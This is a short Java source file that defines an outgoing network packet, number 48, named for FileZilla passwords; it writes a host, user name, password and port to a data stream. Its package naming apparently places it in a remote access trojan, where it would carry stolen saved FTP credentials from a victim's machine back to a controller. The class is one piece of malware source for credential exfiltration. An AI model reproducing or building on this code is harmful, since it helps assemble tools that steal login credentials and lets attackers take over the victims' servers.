package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet48FileZillaPassword extends AbstractOutgoingPacket {
	
	private String host;
	private String user;
	private String password;
	private String port;

	public Packet48FileZillaPassword(String host, String user, String password, String port) {
		this.host = host;
		this.user = user;
		this.password = password;
		this.port = port;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(host);
		sw.writeLine(user);
		sw.writeLine(password);
		sw.writeLine(port);
	}

	@Override
	public byte getPacketId() {
		return 48;
	}

}
